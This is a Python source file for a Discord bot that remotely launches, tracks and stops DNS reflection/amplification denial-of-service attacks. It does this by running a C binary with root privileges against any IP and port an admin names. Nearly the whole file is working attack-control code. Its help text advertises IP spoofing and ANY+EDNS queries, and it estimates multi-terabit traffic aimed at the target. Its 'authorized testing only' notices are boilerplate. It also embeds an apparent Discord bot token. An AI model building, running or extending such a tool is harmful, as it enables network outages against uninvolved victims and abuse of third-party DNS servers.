#!/usr/bin/env python3
import discord
from discord.ext import commands
import asyncio
import subprocess
import os
import re
import psutil
import threading
import time
import json
from datetime import datetime
import socket
import aiohttp

# Bot configuration
DISCORD_TOKEN = "1HC0rtQYYa43yJA-I1hVMwJ5P_7Ngji8"
ADMIN_USER_IDS = [859870812734488646]  # Your Discord User IDs
PREFIX = "!"

# Bot intents
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

class DNSAttackManager:
    def __init__(self):
        self.process = None
        self.is_running = False
        self.start_time = None
        self.attack_log = []
        self.max_log_entries = 100
        
    def log_attack(self, action, target=None, duration=None, user=None):
        """Log attack activities"""
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'action': action,
            'target': target,
            'duration': duration,
            'user': user,
            'pid': self.process.pid if self.process else None
        }
        self.attack_log.append(log_entry)
        
        # Keep log size manageable
        if len(self.attack_log) > self.max_log_entries:
            self.attack_log.pop(0)
    
    async def compile_c_program(self):
        """Compile the C DNS amplifier"""
        try:
            if os.path.exists("./soul2"):
                return True, "Binary already exists"
                
            compile_cmd = ["gcc", "-o", "soul2", "soul2.c", "-lpthread", "-O3"]
            result = subprocess.run(compile_cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                return True, "Compilation successful"
            else:
                return False, f"Compilation failed: {result.stderr}"
                
        except Exception as e:
            return False, f"Compilation error: {str(e)}"
    
    def validate_target(self, ip, port):
        """Validate target IP and port"""
        # IP validation
        ip_pattern = re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
        if not ip_pattern.match(ip):
            return False, "Invalid IP address format"
        
        # Check IP segments
        segments = ip.split('.')
        for segment in segments:
            if not (0 <= int(segment) <= 255):
                return False, "Invalid IP address range"
        
        # Port validation
        if not (1 <= port <= 65535):
            return False, "Port must be 1-65535"
        
        return True, "Valid target"
    
    async def start_attack(self, ip, port, duration, user):
        """Start DNS amplification attack"""
        if self.is_running:
            return False, "Attack already running! Stop current attack first."
        
        # Validate parameters
        is_valid, message = self.validate_target(ip, port)
        if not is_valid:
            return False, message
        
        if not (1 <= duration <= 3600):
            return False, "Duration must be 1-3600 seconds"
        
        try:
            # Check if binary exists and compile if needed
            if not os.path.exists("./soul2"):
                success, compile_msg = await self.compile_c_program()
                if not success:
                    return False, f"Compilation failed: {compile_msg}"
            
            # Check root privileges
            if os.geteuid() != 0:
                return False, "Root privileges required! Run bot with sudo."
            
            # Start attack
            command = ["./soul2", ip, str(port), str(duration)]
            self.process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            self.is_running = True
            self.start_time = datetime.now()
            
            # Log the attack
            self.log_attack("START", f"{ip}:{port}", duration, user)
            
            # Start monitoring thread
            monitor_thread = threading.Thread(target=self.monitor_attack)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            return True, f"Attack started on {ip}:{port} for {duration}s"
            
        except Exception as e:
            return False, f"Failed to start attack: {str(e)}"
    
    def monitor_attack(self):
        """Monitor the attack process in background"""
        try:
            stdout, stderr = self.process.communicate()
            self.is_running = False
            
            # Log completion
            duration = (datetime.now() - self.start_time).total_seconds() if self.start_time else 0
            self.log_attack("COMPLETE", duration=duration)
            
        except Exception as e:
            print(f"Monitor error: {e}")
            self.is_running = False
    
    def stop_attack(self):
        """Stop current attack"""
        if not self.is_running or not self.process:
            return False, "No active attack to stop"
        
        try:
            # Kill process tree
            parent = psutil.Process(self.process.pid)
            children = parent.children(recursive=True)
            
            for child in children:
                child.terminate()
            parent.terminate()
            
            # Wait for termination
            gone, still_alive = psutil.wait_procs([parent] + children, timeout=5)
            for p in still_alive:
                p.kill()
            
            self.is_running = False
            self.process = None
            
            # Log stop
            self.log_attack("STOP")
            
            return True, "Attack stopped successfully"
            
        except Exception as e:
            return False, f"Error stopping attack: {str(e)}"
    
    def get_attack_info(self):
        """Get current attack information"""
        if not self.is_running:
            return None
        
        info = {
            'running': self.is_running,
            'start_time': self.start_time.isoformat() if self.start_time else None,
            'duration': (datetime.now() - self.start_time).total_seconds() if self.start_time else 0,
            'pid': self.process.pid if self.process else None
        }
        
        return info
    
    def calculate_impact(self, ip, port, duration):
        """Calculate estimated attack impact"""
        # DNS amplification calculations
        queries_per_second = 1900000  # From C code
        avg_query_size = 512  # bytes
        amplification_ratio = 50  # 50:1 average
        
        total_queries = queries_per_second * duration
        outgoing_traffic = (total_queries * avg_query_size) / (1024**3)  # GB
        incoming_traffic = outgoing_traffic * amplification_ratio  # GB
        
        outgoing_bw = (queries_per_second * avg_query_size * 8) / 1_000_000_000  # Gbps
        incoming_bw = outgoing_bw * amplification_ratio  # Gbps
        
        return {
            'target': f"{ip}:{port}",
            'duration': duration,
            'total_queries': f"{total_queries:,}",
            'outgoing_traffic_gb': f"{outgoing_traffic:.2f}",
            'incoming_traffic_gb': f"{incoming_traffic:.2f}",
            'outgoing_bandwidth_gbps': f"{outgoing_bw:.2f}",
            'incoming_bandwidth_gbps': f"{incoming_bw:.2f}",
            'amplification_ratio': amplification_ratio,
            'threads': 400,
            'dns_servers': 50
        }

# Initialize attack manager
attack_manager = DNSAttackManager()

def is_admin():
    """Check if user is admin"""
    async def predicate(ctx):
        return ctx.author.id in ADMIN_USER_IDS
    return commands.check(predicate)

@bot.event
async def on_ready():
    print(f'🤖 {bot.user.name} is online!')
    print(f'📊 Monitoring DNS amplification capabilities')
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="DNS Infrastructure"))

@bot.command(name='dns_help')
@is_admin()
async def dns_help(ctx):
    """Show DNS amplification bot help"""
    help_embed = discord.Embed(
        title="🛠️ DNS Amplification Bot Commands",
        description="Advanced DNS Reflection/Amplification Attack System",
        color=0x00ff00
    )
    
    help_embed.add_field(
        name="🎯 Attack Commands",
        value=(
            "`!dns_calc <IP> <PORT> <TIME>` - Calculate attack impact\n"
            "`!dns_attack <IP> <PORT> <TIME>` - Start DNS amplification\n"
            "`!dns_stop` - Stop current attack\n"
            "`!dns_status` - Check attack status"
        ),
        inline=False
    )
    
    help_embed.add_field(
        name="📊 Monitoring Commands",
        value=(
            "`!dns_stats` - System statistics\n"
            "`!dns_logs` - Show attack history\n"
            "`!dns_info` - Bot information"
        ),
        inline=False
    )
    
    help_embed.add_field(
        name="⚡ Technical Info",
        value=(
            "**Amplification:** 50:1 ratio\n"
            "**Queries/sec:** 1.9 million\n"
            "**Threads:** 400\n"
            "**DNS Servers:** 50 providers\n"
            "**Estimated Power:** 15-30 Tbps"
        ),
        inline=False
    )
    
    help_embed.set_footer(text="⚠️ Use responsibly and only on authorized targets")
    
    await ctx.send(embed=help_embed)

@bot.command(name='dns_calc')
@is_admin()
async def dns_calculate(ctx, ip: str, port: int, duration: int):
    """Calculate DNS amplification impact"""
    # Validate inputs
    is_valid, message = attack_manager.validate_target(ip, port)
    if not is_valid:
        await ctx.send(f"❌ {message}")
        return
    
    if not (1 <= duration <= 3600):
        await ctx.send("❌ Duration must be 1-3600 seconds")
        return
    
    # Calculate impact
    impact = attack_manager.calculate_impact(ip, port, duration)
    
    # Create results embed
    calc_embed = discord.Embed(
        title="📊 DNS Amplification Impact Calculation",
        description=f"Target: `{impact['target']}` | Duration: `{duration}s`",
        color=0xffa500
    )
    
    calc_embed.add_field(
        name="🚀 Attack Profile",
        value=(
            f"**Queries/Second:** 1,900,000\n"
            f"**Threads:** {impact['threads']}\n"
            f"**DNS Servers:** {impact['dns_servers']}\n"
            f"**Amplification:** {impact['amplification_ratio']}:1"
        ),
        inline=True
    )
    
    calc_embed.add_field(
        name="📈 Traffic Estimates",
        value=(
            f"**Total Queries:** {impact['total_queries']}\n"
            f"**Outgoing:** {impact['outgoing_traffic_gb']} GB\n"
            f"**Incoming:** {impact['incoming_traffic_gb']} GB"
        ),
        inline=True
    )
    
    calc_embed.add_field(
        name="⚡ Bandwidth Estimates",
        value=(
            f"**Outgoing:** {impact['outgoing_bandwidth_gbps']} Gbps\n"
            f"**Incoming:** {impact['incoming_bandwidth_gbps']} Gbps\n"
            f"**Power:** 15-30 Tbps (estimated)"
        ),
        inline=False
    )
    
    calc_embed.add_field(
        name="⚠️ Warning",
        value="This attack can cause significant network disruption. Use only on authorized targets.",
        inline=False
    )
    
    await ctx.send(embed=calc_embed)

@bot.command(name='dns_attack')
@is_admin()
async def dns_attack(ctx, ip: str, port: int, duration: int):
    """Start DNS amplification attack"""
    # Show calculation first
    await dns_calculate(ctx, ip, port, duration)
    
    # Confirmation message
    confirm_embed = discord.Embed(
        title="🚀 Confirm DNS Amplification Attack",
        description=f"Target: `{ip}:{port}` for `{duration}` seconds",
        color=0xff0000
    )
    
    confirm_embed.add_field(
        name="⚠️ EXTREME IMPACT WARNING",
        value=(
            "This attack will generate **massive traffic** (15-30 Tbps estimated).\n"
            "**Target will likely experience complete network outage.**\n"
            "**Abuse of this tool is illegal and unethical.**"
        ),
        inline=False
    )
    
    confirm_embed.set_footer(text="React with ✅ to confirm or ❌ to cancel")
    
    confirm_msg = await ctx.send(embed=confirm_embed)
    
    # Add reactions
    await confirm_msg.add_reaction('✅')
    await confirm_msg.add_reaction('❌')
    
    # Wait for confirmation
    def check(reaction, user):
        return user == ctx.author and str(reaction.emoji) in ['✅', '❌'] and reaction.message.id == confirm_msg.id
    
    try:
        reaction, user = await bot.wait_for('reaction_add', timeout=30.0, check=check)
        
        if str(reaction.emoji) == '✅':
            # Start attack
            await ctx.send("🔄 Starting DNS amplification attack...")
            
            success, message = await attack_manager.start_attack(ip, port, duration, ctx.author.name)
            
            if success:
                status_embed = discord.Embed(
                    title="✅ Attack Launched",
                    description=message,
                    color=0x00ff00
                )
                status_embed.add_field(
                    name="📡 Monitoring",
                    value="Use `!dns_status` to check progress\nUse `!dns_stop` to terminate early",
                    inline=False
                )
                await ctx.send(embed=status_embed)
            else:
                await ctx.send(f"❌ {message}")
                
        else:
            await ctx.send("❌ Attack cancelled")
            
    except asyncio.TimeoutError:
        await ctx.send("⏰ Confirmation timeout. Attack cancelled.")

@bot.command(name='dns_stop')
@is_admin()
async def dns_stop(ctx):
    """Stop current DNS attack"""
    success, message = attack_manager.stop_attack()
    
    if success:
        embed = discord.Embed(
            title="🛑 Attack Stopped",
            description=message,
            color=0xffa500
        )
    else:
        embed = discord.Embed(
            title="❌ Stop Failed",
            description=message,
            color=0xff0000
        )
    
    await ctx.send(embed=embed)

@bot.command(name='dns_status')
@is_admin()
async def dns_status(ctx):
    """Check attack status"""
    attack_info = attack_manager.get_attack_info()
    
    status_embed = discord.Embed(
        title="📊 DNS Attack Status",
        color=0x00ff00 if attack_info else 0xff0000
    )
    
    if attack_info and attack_info['running']:
        duration = attack_info['duration']
        status_embed.add_field(
            name="🟢 Status",
            value="**ATTACK RUNNING**",
            inline=True
        )
        status_embed.add_field(
            name="⏱️ Duration",
            value=f"{duration:.1f}s",
            inline=True
        )
        status_embed.add_field(
            name="🔢 PID",
            value=attack_info['pid'],
            inline=True
        )
        status_embed.add_field(
            name="🚀 Estimated Impact",
            value="15-30 Tbps to target\n1.9M QPS sent",
            inline=False
        )
    else:
        status_embed.add_field(
            name="🔴 Status",
            value="**NO ACTIVE ATTACK**",
            inline=False
        )
        status_embed.add_field(
            name="💡 Next Steps",
            value="Use `!dns_calc` to plan attack\nUse `!dns_attack` to start",
            inline=False
        )
    
    await ctx.send(embed=status_embed)

@bot.command(name='dns_stats')
@is_admin()
async def dns_stats(ctx):
    """Show system statistics"""
    try:
        # CPU usage
        cpu_percent = psutil.cpu_percent(interval=1)
        
        # Memory usage
        memory = psutil.virtual_memory()
        
        # Network stats
        net_io = psutil.net_io_counters()
        
        # Disk usage
        disk = psutil.disk_usage('/')
        
        # System info
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        uptime = datetime.now() - boot_time
        
        stats_embed = discord.Embed(
            title="💻 System Statistics",
            color=0x0099ff
        )
        
        stats_embed.add_field(
            name="🖥️ CPU",
            value=f"Usage: {cpu_percent}%\nCores: {psutil.cpu_count()}",
            inline=True
        )
        
        stats_embed.add_field(
            name="💾 Memory",
            value=f"Used: {memory.percent}%\nAvailable: {memory.available // (1024**3)}GB",
            inline=True
        )
        
        stats_embed.add_field(
            name="📡 Network",
            value=f"Sent: {net_io.bytes_sent // (1024**2)}MB\nRecv: {net_io.bytes_recv // (1024**2)}MB",
            inline=True
        )
        
        stats_embed.add_field(
            name="💿 Disk",
            value=f"Used: {disk.percent}%\nFree: {disk.free // (1024**3)}GB",
            inline=True
        )
        
        stats_embed.add_field(
            name="⏰ Uptime",
            value=str(uptime).split('.')[0],
            inline=True
        )
        
        # Add attack status
        attack_info = attack_manager.get_attack_info()
        if attack_info and attack_info['running']:
            stats_embed.add_field(
                name="🚀 Attack Status",
                value=f"Running for {attack_info['duration']:.1f}s",
                inline=True
            )
        
        await ctx.send(embed=stats_embed)
        
    except Exception as e:
        await ctx.send(f"❌ Error getting statistics: {str(e)}")

@bot.command(name='dns_logs')
@is_admin()
async def dns_logs(ctx):
    """Show attack history"""
    if not attack_manager.attack_log:
        await ctx.send("📝 No attack history found")
        return
    
    # Show last 5 entries
    recent_logs = attack_manager.attack_log[-5:]
    
    logs_embed = discord.Embed(
        title="📋 Recent Attack History",
        color=0xffff00
    )
    
    for log in reversed(recent_logs):
        timestamp = datetime.fromisoformat(log['timestamp']).strftime("%Y-%m-%d %H:%M:%S")
        
        if log['action'] == 'START':
            value = f"Target: {log['target']}\nDuration: {log['duration']}s\nUser: {log['user']}"
        elif log['action'] == 'STOP':
            value = "Manually stopped"
        elif log['action'] == 'COMPLETE':
            value = f"Completed after {log['duration']:.1f}s"
        else:
            value = log['action']
        
        logs_embed.add_field(
            name=f"{timestamp} - {log['action']}",
            value=value,
            inline=False
        )
    
    await ctx.send(embed=logs_embed)

@bot.command(name='dns_info')
@is_admin()
async def dns_info(ctx):
    """Show bot information"""
    info_embed = discord.Embed(
        title="🤖 DNS Amplification Bot Info",
        color=0x9b59b6
    )
    
    info_embed.add_field(
        name="⚡ Capabilities",
        value=(
            "**Type:** DNS Reflection/Amplification\n"
            "**Amplification:** 50:1 ratio\n"
            "**Max Queries/sec:** 1,900,000\n"
            "**DNS Servers:** 50 providers\n"
            "**Estimated Power:** 15-30 Tbps"
        ),
        inline=False
    )
    
    info_embed.add_field(
        name="🛠️ Technical",
        value=(
            "**Backend:** Custom C implementation\n"
            "**Threads:** 400 concurrent\n"
            "**Protocol:** Raw sockets with IP spoofing\n"
            "**Query Type:** ANY + EDNS for max amplification"
        ),
        inline=False
    )
    
    info_embed.add_field(
        name="⚠️ Legal Notice",
        value=(
            "This tool is for **authorized testing only**.\n"
            "Unauthorized use is **illegal** and **unethical**.\n"
            "Users are responsible for proper authorization."
        ),
        inline=False
    )
    
    info_embed.set_footer(text="Use !dns_help for command list")
    
    await ctx.send(embed=info_embed)

@bot.event
async def on_command_error(ctx, error):
    """Handle command errors"""
    if isinstance(error, commands.CheckFailure):
        await ctx.send("❌ Unauthorized. This bot is for admin use only.")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("❌ Missing required arguments. Use `!dns_help` for usage.")
    else:
        await ctx.send(f"❌ Error: {str(error)}")

def main():
    """Start the Discord bot"""
    print("🚀 Starting DNS Amplification Discord Bot...")
    print("📝 Make sure to:")
    print("  1. Set DISCORD_TOKEN in the script")
    print("  2. Add your Discord User ID to ADMIN_USER_IDS")
    print("  3. Compile soul2.c: gcc -o soul2 soul2.c -lpthread -O3")
    print("  4. Run with sudo for raw socket access")
    
    try:
        bot.run(DISCORD_TOKEN)
    except Exception as e:
        print(f"❌ Failed to start bot: {e}")

if __name__ == "__main__":
    main()
